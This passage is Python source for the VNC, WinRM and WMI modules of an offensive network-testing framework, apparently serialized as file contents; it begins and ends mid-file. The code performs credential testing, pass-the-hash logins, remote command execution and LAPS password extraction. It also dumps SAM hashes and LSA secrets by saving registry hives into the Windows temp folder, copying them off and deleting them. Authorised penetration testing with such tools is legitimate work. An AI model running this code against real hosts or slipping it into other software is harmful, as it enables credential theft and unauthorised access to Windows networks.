VNCConnection\nfrom aardwolf.commons.iosettings import RDPIOSettings\nfrom aardwolf.commons.queuedata.constants import VIDEO_FORMAT\nfrom asyauth.common.credentials import UniCredential\nfrom asyauth.common.constants import asyauthSecret, asyauthProtocol\n\n\nclass vnc(connection):\n    def __init__(self, args, db, host):\n        self.iosettings = RDPIOSettings()\n        self.iosettings.channels = []\n        self.iosettings.video_out_format = VIDEO_FORMAT.RAW\n        self.iosettings.clipboard_use_pyperclip = False\n        self.url = None\n        self.target = None\n        self.credential = None\n        connection.__init__(self, args, db, host)\n\n    def proto_flow(self):\n        self.proto_logger()\n        if self.create_conn_obj():\n            self.print_host_info()\n            if self.login():\n                if hasattr(self.args, ""module"") and self.args.module:\n                    self.call_modules()\n                else:\n                    self.call_cmd_args()\n\n    def proto_logger(self):\n        self.logger = CMEAdapter(\n            extra={\n                ""protocol"": ""VNC"",\n                ""host"": self.host,\n                ""port"": self.args.port,\n                ""hostname"": self.hostname,\n            }\n        )\n\n    def print_host_info(self):\n        self.logger.display(f""VNC connecting to {self.hostname}"")\n\n    def create_conn_obj(self):\n        try:\n            self.target = RDPTarget(ip=self.host, port=self.args.port)\n            credential = UniCredential(protocol=asyauthProtocol.PLAIN, stype=asyauthSecret.NONE)\n            self.conn = VNCConnection(target=self.target, credentials=credential, iosettings=self.iosettings)\n            asyncio.run(self.connect_vnc(True))\n        except Exception as e:\n            self.logger.debug(str(e))\n            if ""Server supports:"" not in str(e):\n                return False\n        return True\n\n    async def connect_vnc(self, discover=False):\n        _, err = await self.conn.connect()\n        if err is not None:\n            if not discover:\n                await asyncio.sleep(self.args.vnc_sleep)\n            raise err\n        return True\n\n    def plaintext_login(self, username, password):\n        try:\n            stype = asyauthSecret.PASS\n            if password == """":\n                stype = asyauthSecret.NONE\n            self.credential = UniCredential(secret=password, protocol=asyauthProtocol.PLAIN, stype=stype)\n            self.conn = VNCConnection(\n                target=self.target,\n                credentials=self.credential,\n                iosettings=self.iosettings,\n            )\n            asyncio.run(self.connect_vnc())\n\n            self.admin_privs = True\n            self.logger.success(\n                ""{} {}"".format(\n                    password,\n                    highlight(f""({self.config.get(\'CME\', \'pwn3d_label\')})"" if self.admin_privs else """"),\n                )\n            )\n            return True\n\n        except Exception as e:\n            self.logger.debug(str(e))\n            if ""Server supports: 1"" in str(e):\n                self.logger.success(\n                    ""{} {}"".format(\n                        ""No password seems to be accepted by the server"",\n                        highlight(f""({self.config.get(\'CME\', \'pwn3d_label\')})"" if self.admin_privs else """"),\n                    )\n                )\n            else:\n                self.logger.fail(f""{password} {\'Authentication failed\'}"")\n            return False\n\n    async def screen(self):\n        self.conn = VNCConnection(target=self.target, credentials=self.credential, iosettings=self.iosettings)\n        await self.connect_vnc()\n        await asyncio.sleep(int(self.args.screentime))\n        if self.conn is not None and self.conn.desktop_buffer_has_data is True:\n            buffer = self.conn.get_desktop_buffer(VIDEO_FORMAT.PIL)\n            filename = os.path.expanduser(f""~/.cme/screenshots/{self.hostname}_{self.host}_{datetime.now().strftime(\'%Y-%m-%d_%H%M%S\')}.png"")\n            buffer.save(filename, ""png"")\n            self.logger.highlight(f""Screenshot saved {filename}"")\n\n    def screenshot(self):\n        asyncio.run(self.screen())\n', 'winrm.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport binascii\nimport hashlib\nimport os\nimport requests\n\nfrom io import StringIO\nfrom datetime import datetime\nfrom pypsrp.client import Client\n\nfrom impacket.smbconnection import SMBConnection\nfrom impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes\n\nfrom cme.config import process_secret\nfrom cme.connection import *\nfrom cme.helpers.bloodhound import add_user_bh\nfrom cme.protocols.ldap.laps import LDAPConnect, LAPSv2Extract\nfrom cme.logger import CMEAdapter\n\nclass winrm(connection):\n    def __init__(self, args, db, host):\n        self.domain = None\n        self.server_os = None\n        self.output_filename = None\n        self.endpoint = None\n        self.port = None\n        self.hash = None\n        self.lmhash = None\n        self.nthash = None\n\n        connection.__init__(self, args, db, host)\n\n    def proto_logger(self):\n        self.logger = CMEAdapter(\n            extra={\n                ""protocol"": ""WINRM"",\n                ""host"": self.host,\n                ""port"": self.args.port if self.args.port else 5985,\n                ""hostname"": self.hostname,\n            }\n        )\n\n    def enum_host_info(self):\n        # smb no open, specify the domain\n        if self.args.no_smb:\n            self.domain = self.args.domain\n        else:\n            # try:\n            smb_conn = SMBConnection(self.host, self.host, None, timeout=5)\n            no_ntlm = False\n            try:\n                smb_conn.login("""", """")\n            except BrokenPipeError:\n                self.logger.fail(f""Broken Pipe Error while attempting to login"")\n            except Exception as e:\n                if ""STATUS_NOT_SUPPORTED"" in str(e):\n                    # no ntlm supported\n                    no_ntlm = True\n                pass\n\n            self.domain = smb_conn.getServerDNSDomainName() if not no_ntlm else self.args.domain\n            self.hostname = smb_conn.getServerName() if not no_ntlm else self.host\n            self.server_os = smb_conn.getServerOS()\n            if isinstance(self.server_os.lower(), bytes):\n                self.server_os = self.server_os.decode(""utf-8"")\n\n            self.logger.extra[""hostname""] = self.hostname\n\n            self.output_filename = os.path.expanduser(f""~/.cme/logs/{self.hostname}_{self.host}_{datetime.now().strftime(\'%Y-%m-%d_%H%M%S\')}"")\n\n            try:\n                smb_conn.logoff()\n            except:\n                pass\n            # except Exception as e:\n            #     self.logger.fail(\n            #         f""Error retrieving host domain: {e} specify one manually with the \'-d\' flag""\n            #     )\n\n            if self.args.domain:\n                self.domain = self.args.domain\n\n            if self.args.local_auth:\n                self.domain = self.hostname\n\n            if self.server_os is None:\n                self.server_os = """"\n            if self.domain is None:\n                self.domain = """"\n\n            self.db.add_host(self.host, self.port, self.hostname, self.domain, self.server_os)\n\n        self.output_filename = os.path.expanduser(f""~/.cme/logs/{self.hostname}_{self.host}_{datetime.now().strftime(\'%Y-%m-%d_%H%M%S\')}"".replace("":"", ""-""))\n\n    def laps_search(self, username, password, ntlm_hash, domain):\n        ldapco = LDAPConnect(self.domain, ""389"", self.domain)\n\n        if self.kerberos:\n            if self.kdcHost is None:\n                self.logger.fail(""Add --kdcHost parameter to use laps with kerberos"")\n                return False\n\n            connection = ldapco.kerberos_login(\n                domain,\n                username[0] if username else """",\n                password[0] if password else """",\n                ntlm_hash[0] if ntlm_hash else """",\n                kdcHost=self.kdcHost,\n                aesKey=self.aesKey,\n            )\n        else:\n            connection = ldapco.auth_login(\n                domain,\n                username[0] if username else """",\n                password[0] if password else """",\n                ntlm_hash[0] if ntlm_hash else """",\n            )\n        if not connection:\n            self.logger.fail(""LDAP connection failed with account {}"".format(username[0]))\n            return False\n\n        search_filter = ""(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*))(name="" + self.hostname + ""))""\n        attributes = [\n            ""msLAPS-EncryptedPassword"",\n            ""msLAPS-Password"",\n            ""ms-MCS-AdmPwd"",\n            ""sAMAccountName"",\n        ]\n        results = connection.search(searchFilter=search_filter, attributes=attributes, sizeLimit=0)\n\n        msMCSAdmPwd = """"\n        sAMAccountName = """"\n        username_laps = """"\n\n        from impacket.ldap import ldapasn1 as ldapasn1_impacket\n\n        results = [r for r in results if isinstance(r, ldapasn1_impacket.SearchResultEntry)]\n        if len(results) != 0:\n            for host in results:\n                values = {str(attr[""type""]).lower(): attr[""vals""][0] for attr in host[""attributes""]}\n                if ""mslaps-encryptedpassword"" in values:\n                    from json import loads\n                    msMCSAdmPwd = values[""mslaps-encryptedpassword""]\n                    d = LAPSv2Extract(\n                        bytes(msMCSAdmPwd),\n                        username[0] if username else """",\n                        password[0] if password else """",\n                        domain,\n                        ntlm_hash[0] if ntlm_hash else """",\n                        self.args.kerberos,\n                        self.args.kdcHost,\n                        339)\n                    data = d.run()\n                    r = loads(data)\n                    msMCSAdmPwd = r[""p""]\n                    username_laps = r[""n""]\n                elif ""mslaps-password"" in values:\n                    from json import loads\n                    r = loads(str(values[""mslaps-password""]))\n                    msMCSAdmPwd = r[""p""]\n                    username_laps = r[""n""]\n                elif ""ms-mcs-admpwd"" in values:\n                    msMCSAdmPwd = str(values[""ms-mcs-admpwd""])\n                else:\n                    self.logger.fail(""No result found with attribute ms-MCS-AdmPwd or"" "" msLAPS-Password"")\n            self.logger.debug(""Host: {:<20} Password: {} {}"".format(sAMAccountName, msMCSAdmPwd, self.hostname))\n        else:\n            self.logger.fail(""msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS"" "" property for {}"".format(self.hostname))\n            return False\n\n        self.username = self.args.laps if not username_laps else username_laps\n        self.password = msMCSAdmPwd\n\n        if msMCSAdmPwd == """":\n            self.logger.fail(""msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS"" "" property for {}"".format(self.hostname))\n            return False\n        if ntlm_hash:\n            hash_ntlm = hashlib.new(""md4"", msMCSAdmPwd.encode(""utf-16le"")).digest()\n            self.hash = binascii.hexlify(hash_ntlm).decode()\n\n        self.domain = self.hostname\n        return True\n\n    def print_host_info(self):\n        if self.args.domain:\n            self.logger.extra[""protocol""] = ""HTTP""\n            self.logger.display(self.endpoint)\n        else:\n            self.logger.extra[""protocol""] = ""SMB""\n            self.logger.display(f""{self.server_os} (name:{self.hostname}) (domain:{self.domain})"")\n            self.logger.extra[""protocol""] = ""HTTP""\n            self.logger.display(self.endpoint)\n\n        if self.args.laps:\n            return self.laps_search(self.args.username, self.args.password, self.args.hash, self.domain)\n        return True\n\n    def create_conn_obj(self):\n        endpoints = [\n            f""https://{self.host}:{self.args.port if self.args.port else 5986}/wsman"",\n            f""http://{self.host}:{self.args.port if self.args.port else 5985}/wsman"",\n        ]\n\n        for url in endpoints:\n            try:\n                self.logger.debug(f""winrm create_conn_obj() - Requesting URL: {url}"")\n                res = requests.post(url, verify=False, timeout=self.args.http_timeout)\n                self.logger.debug(""winrm create_conn_obj() - Received response code:"" f"" {res.status_code}"")\n                self.endpoint = url\n                if self.endpoint.startswith(""https://""):\n                    self.logger.extra[""port""] = self.args.port if self.args.port else 5986\n                else:\n                    self.logger.extra[""port""] = self.args.port if self.args.port else 5985\n                return True\n            except requests.exceptions.Timeout as e:\n                self.logger.info(f""Connection Timed out to WinRM service: {e}"")\n            except requests.exceptions.ConnectionError as e:\n                if ""Max retries exceeded with url"" in str(e):\n                    self.logger.info(f""Connection Timeout to WinRM service (max retries exceeded)"")\n                else:\n                    self.logger.info(f""Other ConnectionError to WinRM service: {e}"")\n        return False\n\n    def plaintext_login(self, domain, username, password):\n        try:\n            from urllib3.connectionpool import log\n\n            # log.addFilter(SuppressFilter())\n            if not self.args.laps:\n                self.password = password\n                self.username = username\n            self.domain = domain\n            if self.args.ssl and self.args.ignore_ssl_cert:\n                self.conn = Client(\n                    self.host,\n                    auth=""ntlm"",\n                    username=f""{domain}\\\\{self.username}"",\n                    password=self.password,\n                    ssl=True,\n                    cert_validation=False,\n                )\n            elif self.args.ssl:\n                self.conn = Client(\n                    self.host,\n                    auth=""ntlm"",\n                    username=f""{domain}\\\\{self.username}"",\n                    password=self.password,\n                    ssl=True,\n                )\n            else:\n                self.conn = Client(\n                    self.host,\n                    auth=""ntlm"",\n                    username=f""{domain}\\\\{self.username}"",\n                    password=self.password,\n                    ssl=False,\n                )\n\n            # TO DO: right now we\'re just running the hostname command to make the winrm library auth to the server\n            # we could just authenticate without running a command :) (probably)\n            self.conn.execute_ps(""hostname"")\n            self.admin_privs = True\n            self.logger.success(f""{self.domain}\\\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}"")\n\n            self.logger.debug(f""Adding credential: {domain}/{self.username}:{self.password}"")\n            self.db.add_credential(""plaintext"", domain, self.username, self.password)\n            # TODO: when we can easily get the host_id via RETURNING statements, readd this in\n            # host_id = self.db.get_hosts(self.host)[0].id\n            # self.db.add_loggedin_relation(user_id, host_id)\n\n            if self.admin_privs:\n                self.logger.debug(f""Inside admin privs"")\n                self.db.add_admin_user(""plaintext"", domain, self.username, self.password, self.host)  # , user_id=user_id)\n\n            if not self.args.local_auth:\n                add_user_bh(self.username, self.domain, self.logger, self.config)\n            return True\n        except Exception as e:\n            if ""with ntlm"" in str(e):\n                self.logger.fail(f""{self.domain}\\\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}"")\n            else:\n                self.logger.fail(f""{self.domain}\\\\{self.username}:{process_secret(self.password)} {self.mark_pwned()} \'{e}\'"")\n\n            return False\n\n    def hash_login(self, domain, username, ntlm_hash):\n        try:\n            # from urllib3.connectionpool import log\n\n            # log.addFilter(SuppressFilter())\n            lmhash = ""00000000000000000000000000000000:""\n            nthash = """"\n\n            if not self.args.laps:\n                self.username = username\n                # This checks to see if we didn\'t provide the LM Hash\n                if ntlm_hash.find("":"") != -1:\n                    lmhash, nthash = ntlm_hash.split("":"")\n                else:\n                    nthash = ntlm_hash\n                    ntlm_hash = lmhash + nthash\n                if lmhash:\n                    self.lmhash = lmhash\n                if nthash:\n                    self.nthash = nthash\n            else:\n                nthash = self.hash\n\n            self.domain = domain\n            if self.args.ssl and self.args.ignore_ssl_cert:\n                self.conn = Client(\n                    self.host,\n                    auth=""ntlm"",\n                    username=f""{self.domain}\\\\{self.username}"",\n                    password=lmhash + nthash,\n                    ssl=True,\n                    cert_validation=False,\n                )\n            elif self.args.ssl:\n                self.conn = Client(\n                    self.host,\n                    auth=""ntlm"",\n                    username=f""{self.domain}\\\\{self.username}"",\n                    password=lmhash + nthash,\n                    ssl=True,\n                )\n            else:\n                self.conn = Client(\n                    self.host,\n                    auth=""ntlm"",\n                    username=f""{self.domain}\\\\{self.username}"",\n                    password=lmhash + nthash,\n                    ssl=False,\n                )\n\n            # TO DO: right now we\'re just running the hostname command to make the winrm library auth to the server\n            # we could just authenticate without running a command :) (probably)\n            self.conn.execute_ps(""hostname"")\n            self.admin_privs = True\n            self.logger.success(f""{self.domain}\\\\{self.username}:{process_secret(nthash)} {self.mark_pwned()}"")\n            self.db.add_credential(""hash"", domain, self.username, nthash)\n\n            if self.admin_privs:\n                self.db.add_admin_user(""hash"", domain, self.username, nthash, self.host)\n\n            if not self.args.local_auth:\n                add_user_bh(self.username, self.domain, self.logger, self.config)\n            return True\n\n        except Exception as e:\n            if ""with ntlm"" in str(e):\n                self.logger.fail(f""{self.domain}\\\\{self.username}:{process_secret(nthash)}"")\n            else:\n                self.logger.fail(f""{self.domain}\\\\{self.username}:{process_secret(nthash)} \'{e}\'"")\n            return False\n\n    def execute(self, payload=None, get_output=False):\n        try:\n            r = self.conn.execute_cmd(self.args.execute, encoding=self.args.codec)\n        except:\n            self.logger.info(""Cannot execute command, probably because user is not local admin, but"" "" powershell command should be ok!"")\n            r = self.conn.execute_ps(self.args.execute)\n        self.logger.success(""Executed command"")\n        buf = StringIO(r[0]).readlines()\n        for line in buf:\n            self.logger.highlight(line.strip())\n\n\n    def ps_execute(self, payload=None, get_output=False):\n        r = self.conn.execute_ps(self.args.ps_execute)\n        self.logger.success(""Executed command"")\n        buf = StringIO(r[0]).readlines()\n        for line in buf:\n            self.logger.highlight(line.strip())\n\n    def sam(self):\n        self.conn.execute_cmd(""reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM"" "" C:\\\\windows\\\\temp\\\\SYSTEM"")\n        self.conn.fetch(""C:\\\\windows\\\\temp\\\\SAM"", self.output_filename + "".sam"")\n        self.conn.fetch(""C:\\\\windows\\\\temp\\\\SYSTEM"", self.output_filename + "".system"")\n        self.conn.execute_cmd(""del C:\\\\windows\\\\temp\\\\SAM && del C:\\\\windows\\\\temp\\\\SYSTEM"")\n\n        local_operations = LocalOperations(f""{self.output_filename}.system"")\n        boot_key = local_operations.getBootKey()\n        SAM = SAMHashes(\n            f""{self.output_filename}.sam"",\n            boot_key,\n            isRemote=None,\n            perSecretCallback=lambda secret: self.logger.highlight(secret),\n        )\n        SAM.dump()\n        SAM.export(f""{self.output_filename}.sam"")\n\n    def lsa(self):\n        self.conn.execute_cmd(""reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM"" "" C:\\\\windows\\\\temp\\\\SYSTEM"")\n        self.conn.fetch(""C:\\\\windows\\\\temp\\\\SECURITY"", f""{self.output_filename}.security"")\n        self.conn.fetch(""C:\\\\windows\\\\temp\\\\SYSTEM"", f""{self.output_filename}.system"")\n        self.conn.execute_cmd(""del C:\\\\windows\\\\temp\\\\SYSTEM && del C:\\\\windows\\\\temp\\\\SECURITY"")\n\n        local_operations = LocalOperations(f""{self.output_filename}.system"")\n        boot_key = local_operations.getBootKey()\n        LSA = LSASecrets(\n            f""{self.output_filename}.security"",\n            boot_key,\n            None,\n            isRemote=None,\n            perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),\n        )\n        LSA.dumpCachedHashes()\n        LSA.dumpSecrets()\n', 'wmi.py': 'import os, struct, logging\n\nfrom io import StringIO\nfrom six import indexbytes\nfrom datetime import datetime\nfrom cme.config import process_secret\nfrom cme.connection import *\nfrom cme.logger import CMEAdapter\nfrom cme.protocols.wmi import wmiexec, wmiexec_event\n\nfrom impacket import ntlm\nfrom impacket.uuid import uuidtup_to_bin\nfrom impacket.krb5.ccache import CCache\nfrom impacket.dcerpc.v5.dtypes import NULL\nfrom impacket.dcerpc.v5 import transport, epm\nfrom impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, MSRPC_BIND, MSRPCBind, CtxItem, MSRPCHeader, SEC_TRAILER, MSRPCBindAck\nfrom impacket.dcerpc.v5.dcomrt import DCOMConnection\nfrom impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, WBEM_FLAG_FORWARD_ONLY, IWbemLevel1Login\n\nMSRPC_UUID_PORTMAP = uuidtup_to_bin((\'E1AF8308-5D1F-11C9-91A4-08002B14A0FA\', \'3.0\'))\n\nclass wmi(connection):\n\n    def __init__(self, args, db, host):\n        self.domain = None\n        self.hash = \'\'\n        self.lmhash = \'\'\n        self.nthash = \'\'\n        self.fqdn = \'\'\n        self.remoteName = \'\'\n        self.server_os = None\n        self.doKerberos = False\n        self.stringBinding = None\n        # From: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/18d8fbe8-a967-4f1c-ae50-99ca8e491d2d\n        self.rpc_error_status = {\n            ""0000052F"" : ""STATUS_ACCOUNT_RESTRICTION"",\n            ""00000533"" : ""STATUS_ACCOUNT_DISABLED"",\n            ""00000775"" : ""STATUS_ACCOUNT_LOCKED_OUT"",\n            ""00000701"" : ""STATUS_ACCOUNT_EXPIRED"",\n            ""00000532"" : ""STATUS_PASSWORD_EXPIRED"",\n            ""00000530"" : ""STATUS_INVALID_LOGON_HOURS"",\n            ""00000531"" : ""STATUS_INVALID_WORKSTATION"",\n            ""00000569"" : ""STATUS_LOGON_TYPE_NOT_GRANTED"",\n            ""00000773"" : ""STATUS_PASSWORD_MUST_CHANGE"",\n            ""00000005"" : ""STATUS_ACCESS_DENIED"",\n            ""0000052E"" : ""STATUS_LOGON_FAILURE"",\n            ""0000052B"" : ""STATUS_WRONG_PASSWORD"",\n            ""00000721"" : ""RPC_S_SEC_PKG_ERROR""\n        }\n\n        connection.__init__(self, args, db, host)\n\n    def proto_logger(self):\n        self.logger = CMEAdapter(extra={\'protocol\': \'WMI\',\n                                        \'host\': self.host,\n                                        \'port\': self.args.port,\n                                        \'hostname\': self.hostname})\n    \n    def create_conn_obj(self):\n        if self.remoteName == \'\':\n            self.remoteName = self.host\n        try:\n            rpctansport = transport.DCERPCTransportFactory(r\'ncacn_ip_tcp:{0}[{1}]\'.format(self.remoteName, str(self.args.port)))\n            rpctansport.set_credentials(username="""", password="""", domain="""", lmhash="""", nthash="""", aesKey="""")\n            rpctansport.setRemoteHost(self.host)\n            rpctansport.set_connect_timeout(self.args.rpc_timeout)\n            dce = rpctansport.get_dce_rpc()\n            dce.set_auth_type(RPC_C_AUTHN_WINNT)\n            dce.connect()\n            dce.bind(MSRPC_UUID_PORTMAP)\n            dce.disconnect()\n        except Exception as e:\n            self.logger.debug(str(e))\n            return False\n        else:\n            self.conn = rpctansport\n            return True\n    \n    def enum_host_info(self):\n        # All code pick from DumpNTLNInfo.py\n        # https://github.com/fortra/impacket/blob/master/examples/DumpNTLMInfo.py\n        ntlmChallenge = None\n        \n        bind = MSRPCBind()\n        item = CtxItem()\n        item[\'AbstractSyntax\'] = epm.MSRPC_UUID_PORTMAP\n        item[\'TransferSyntax\'] = uuidtup_to_bin((\'8a885d04-1ceb-11c9-9fe8-08002b104860\', \'2.0\'))\n        item[\'ContextID\'] = 0\n        item[\'TransItems\'] = 1\n        bind.addCtxItem(item)\n\n        packet = MSRPCHeader()\n        packet[\'type\'] = MSRPC_BIND\n        packet[\'pduData\'] = bind.getData()\n        packet[\'call_id\'] = 1\n\n        auth = ntlm.getNTLMSSPType1(\'\', \'\', signingRequired=True, use_ntlmv2=True)\n        sec_trailer = SEC_TRAILER()\n        sec_trailer[\'auth_type\']   = RPC_C_AUTHN_WINNT\n        sec_trailer[\'auth_level\']  = RPC_C_AUTHN_LEVEL_PKT_INTEGRITY\n        sec_trailer[\'auth_ctx_id\'] = 0 + 79231 \n        pad = (4 - (len(packet.get_packet()) % 4)) % 4\n        if pad != 0:\n            packet[\'pduData\'] += b\'\\xFF\'*pad\n            sec_trailer[\'auth_pad_len\']=pad\n        packet[\'sec_trailer\'] = sec_trailer\n        packet[\'auth_data\'] = auth\n\n        try:\n            self.conn.connect()\n            self.conn.send(packet.get_packet())\n            buffer = self.conn.recv()\n        except:\n            buffer = 0\n\n        if buffer != 0:\n            response = MSRPCHeader(buffer)\n            bindResp = MSRPCBindAck(response.getData())\n\n            ntlmChallenge = ntlm.NTLMAuthChallenge(bindResp[\'auth_data\'])\n\n            if ntlmChallenge[\'TargetInfoFields_len\'] > 0:\n                av_pairs = ntlm.AV_PAIRS(ntlmChallenge[\'TargetInfoFields\'][:ntlmChallenge[\'TargetInfoFields_len\']])\n                if av_pairs[ntlm.NTLMSSP_AV_HOSTNAME][1] is not None:\n                    try:\n                        self.hostname = av_pairs[ntlm.NTLMSSP_AV_HOSTNAME][1].decode(\'utf-16le\')\n                    except:\n                        self.hostname = self.host\n                if av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME][1] is not None:\n                    try:\n                        self.domain = av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME][1].decode(\'utf-16le\')\n                    except:\n                        self.domain = self.args.domain\n                if av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME][1] is not None:\n                    try:\n                        self.fqdn = av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME][1].decode(\'utf-16le\')\n                    except:\n                        pass\n                if \'Version\' in ntlmChallenge.fields:\n                    version = ntlmChallenge[\'Version\']\n                    if len(version) >= 4:\n                        self.server_os = ""Windows NT %d.%d Build %d"" % (indexbytes(version,0), indexbytes(version,1), struct.unpack(\'<H\',version[2:4])[0])\n        else:\n            self.hostname = self.host\n\n        if self.args.local_auth:\n            self.domain = self.hostname\n        if self.args.domain:\n            self.domain = self.args.domain\n            self.fqdn = f""{self.hostname}.{self.domain}""\n\n        self.logger.extra[""hostname""] = self.hostname\n\n        self.output_filename = os.path.expanduser(f""~/.cme/logs/{self.hostname}_{self.host}_{datetime.now().strftime(\'%Y-%m-%d_%H%M%S\')}"".replace("":"", ""-""))\n\n    def print_host_info(self):\n        self.logger.extra[\'protocol\'] = ""RPC""\n        self.logger.extra[\'port\'] = ""135""\n        self.logger.display(u""{} (name:{}) (domain:{})"".format(self.server_os,\n                                                        self.hostname,\n                                                        self.domain))\n        return True\n\n    def check_if_admin(self):\n        try:\n            dcom = DCOMConnection(self.conn.getRemoteName(), self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True, doKerberos=self.doKerberos ,kdcHost=self.kdcHost, aesKey=self.aesKey)\n            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)\n            flag, self.stringBinding = dcom_FirewallChecker(iInterface, self.args.rpc_timeout)\n        except Exception as e:\n            if ""dcom"" in locals():\n                dcom.disconnect()\n\n            if not str(e).find(""access_denied"") > 0:\n                self.logger.fail(str(e))\n        else:\n            if not flag or not self.stringBinding:\n                dcom.disconnect()\n                error_msg = f\'Check admin error: dcom initialization failed with stringbinding: ""{self.stringBinding}"", please try ""--rpc-timeout"" option. (probably is admin)\'\n                \n                if not self.stringBinding:\n                    error_msg = ""Check admin error: dcom initialization failed: can\'t get target stringbinding, maybe cause by IPv6 or any other issues, please check your target again""\n                \n                self.logger.fail(error_msg) if not flag else self.logger.debug(error_msg)\n            else:\n                try:\n                    iWbemLevel1Login = IWbemLevel1Login(iInterface)\n                    iWbemServices = iWbemLevel1Login.NTLMLogin(\'//./root/cimv2\', NULL, NULL)\n                except Exception as e:\n                    dcom.disconnect()\n\n                    if not str(e).find(""access_denied"") > 0:\n                        self.logger.fail(str(e))\n                else:\n                    dcom.disconnect()\n                    self.logger.extra[\'protocol\'] = ""WMI""\n                    self.admin_privs = True\n        return\n\n    def kerberos_login(self, domain, username, password="""", ntlm_hash="""", aesKey="""", kdcHost="""", useCache=False):\n        logging.getLogger(""impacket"").disabled = True\n        lmhash = \'\'\n        nthash = \'\'\n        self.password = password\n        self.username = username\n        self.domain = domain\n        self.remoteName = self.fqdn\n        self.create_conn_obj()\n        \n        if password == """":\n            if ntlm_hash.find(\':\') != -1:\n                lmhash, nthash = ntlm_hash.split(\':\')\n            else:\n                nthash = ntlm_hash\n            self.nthash = nthash\n            self.lmhash = lmhash\n        \n        if not all("""" == s for s in [nthash, password, aesKey]):\n            kerb_pass = next(s for s in [nthash, password, aesKey] if s)\n        else:\n            kerb_pass = """"\n        \n        if useCache:\n            if kerb_pass == """":\n                ccache = CCache.loadFile(os.getenv(""KRB5CCNAME""))\n                username = ccache.credentials[0].header[\'client\'].prettyPrint().decode().split(""@"")[0]\n                self.username = username\n\n        used_ccache = "" from ccache"" if useCache else f"":{process_secret(kerb_pass)}""\n        try:\n            self.conn.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, aesKey=self.aesKey)\n            self.conn.set_kerberos(True, kdcHost)\n            dce = self.conn.get_dce_rpc()\n            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n            dce.connect()\n            dce.bind(MSRPC_UUID_PORTMAP)\n        except Exception as e:\n            dce.disconnect()\n            error_msg = str(e).lower()\n            self.logger.debug(error_msg)\n            if ""unpack requires a buffer of 4 bytes"" in error_msg:\n                error_msg = ""Kerberos authentication failure""\n                out = f""{self.domain}\\\\{self.username}{used_ccache} {error_msg}""\n                self.logger.fail(out)\n            elif ""kerberos sessionerror"" in str(e).lower():\n                out = f""{self.domain}\\\\{self.username}{used_ccache} {list(e.getErrorString())[0]}""\n                self.logger.fail(out, color=""magenta"")\n                return False\n            else:\n                out = f""{self.domain}\\\\{self.username}{used_ccache} {str(e)}""\n                self.logger.fail(out, color=""red"")\n                return False\n        else:\n            try:\n                # Get data from rpc connection if got vaild creds\n                entry_handle = epm.ept_lookup_handle_t()\n                request = epm.ept_lookup()\n                request[\'inquiry_type\'] = 0x0\n                request[\'object\'] = NULL\n                request[\'Ifid\'] = NULL\n                request[\'vers_option\'] = 0x1\n                request[\'entry_handle\'] = entry_handle\n                request[\'max_ents\'] = 1\n                resp = dce.request(request)\n            except Exception as e:\n                dce.disconnect()\n                error_msg = str(e).lower()\n                self.logger.debug(error_msg)\n                for code in self.rpc_error_status.keys():\n                    if code in error_msg:\n                        error_msg = self.rpc_error_status[code]\n                out = f""{self.domain}\\\\{self.username}{used_ccache} {error_msg.upper()}""\n                self.logger.fail(out, color=(""red"" if ""access_denied"" in error_msg else ""magenta""))\n                return False\n            else:\n                self.doKerberos = True\n                self.check_if_admin()\n                dce.disconnect()\n                out = f""{self.domain}\\\\{self.username}{used_ccache} {self.mark_pwned()}""\n                self.logger.success(out)\n                return True\n\n    def plaintext_login(self, domain, username, password):\n        self.password = password\n        self.username = username\n        self.domain = domain\n        try:\n            self.conn.set_credentials(username=self.username, password=self.password, domain=self.domain, lmhash=self.lmhash, nthash=self.nthash)\n            dce = self.conn.get_dce_rpc()\n            dce.set_auth_type(RPC_C_AUTHN_WINNT)\n            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n            dce.connect()\n            dce.bind(MSRPC_UUID_PORTMAP)\n        except Exception as e:\n            dce.disconnect()\n            self.logger.debug(str(e))\n            out = f""{self.domain}\\\\{self.username}:{process_secret(self.password)} {str(e)}""\n            self.logger.fail(out, color=""red"")\n        else:\n            try:\n                # Get data from rpc connection if got vaild creds\n                entry_handle = epm.ept_lookup_handle_t()\n                request = epm.ept_lookup()\n                request[\'inquiry_type\'] = 0x0\n                request[\'object\'] = NULL\n                request[\'Ifid\'] = NULL\n                request[\'vers_option\'] = 0x1\n                request[\'entry_handle\'] = entry_handle\n                request[\'max_ents\'] = 1\n                resp = dce.request(request)\n            except  Exception as e:\n                dce.disconnect()\n                error_msg = str(e).lower()\n                self.logger.debug(error_msg)\n                for code in self.rpc_error_status.keys():\n                    if code in error_msg:\n                        error_msg = self.rpc_error_status[code]\n                self.logger.fail((f""{self.domain}\\\\{self.username}:{process_secret(self.password)} ({error_msg.upper()})""), color=(""red"" if ""access_denied"" in error_msg else ""magenta""))\n                return False\n            else:\n                self.check_if_admin()\n                dce.disconnect()\n                out = 